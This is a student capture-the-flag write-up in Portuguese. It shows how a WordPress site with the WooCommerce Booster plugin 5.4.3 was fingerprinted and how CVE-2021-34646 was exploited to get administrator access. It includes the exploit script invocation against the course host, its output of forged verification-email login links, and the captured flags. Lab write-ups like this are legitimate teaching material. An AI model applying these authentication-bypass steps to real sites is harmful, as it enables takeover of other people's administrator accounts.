# CTF 1 

## Primeira parte

Ao aceder à página **http://ctf-fsi.fe.up.pt:5001**, que é um servidor WordPress, começamos por inferir todas as dependências do site. Através de uma pesquisa mais cuidada, tanto pela navegação nos diversos links como pelo código-fonte do mesmo, acabamos por descobrir em [DIR] as seguintes dependências:

- Wordpress 5.8.2
- Plugin Woocommerce Booster 5.4.3
- Tema Storefront na versão 3.9.1

Depois investigamos em bases de dados de CVEs vulnerabilidades associadas a cada plugin e cada versão, com principal incidência nas que permitissem fazer login como outro utilizador. A CVE-2021-34646 do WooCommerce 5.4.3 pareceu-nos adequada, e ao usarmos a `flag[CVE-2021-34646]` ultrapassamos a primeira parte do desafio.

## Segunda parte

Descoberta a vulnerabilidade da versão 5.4.3 do plugin WooCommerce, catalogada e disponível [aqui](https://www.exploit-db.com/exploits/50299), tivemos acesso a passos detalhados que permitiam explorá-la. A primeira tarefa foi aceder a `https://target.com/wp-json/wp/v2/users/` de forma a encontrarmos IDs de administradores. Após descoberta do ID=1, que é normalmente o usado por utilizadores de acessos priveligiados, também tivemos acesso a um script em Python que usava esse mesmo identificador para atacar o site: 

````bash
$ python3 script.py http://ctf-fsi.fe.up.pt:5001 1
````

Como resultado obtivemos alguns links:

````
Timestamp: Fri, 07 Oct 2022 10:32:54 GMT
Timestamp (unix): 1665138774

We need to generate multiple timestamps in order to avoid delay related timing errors
One of the following links will log you in...

#0 link for hash b8f64a0ef997c812589538daf4778731:
http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiYjhmNjRhMGVmOTk3YzgxMjU4OTUzOGRhZjQ3Nzg3MzEifQ

#1 link for hash 7bab6c3f87bb43a8700395f17fba953b:
http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiN2JhYjZjM2Y4N2JiNDNhODcwMDM5NWYxN2ZiYTk1M2IifQ

#2 link for hash 92b66b0659b9b9e339d4afe1c09dee10:
http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiOTJiNjZiMDY1OWI5YjllMzM5ZDRhZmUxYzA5ZGVlMTAifQ
````

Aceder a um dos três resultados obtidos permitiu-nos fazer login na conta do administrador do site. Bastou seguir as indicações do guião para acedermos também à. Lá estava escrita a flag final do desafio, `flag{please don't bother me}`.
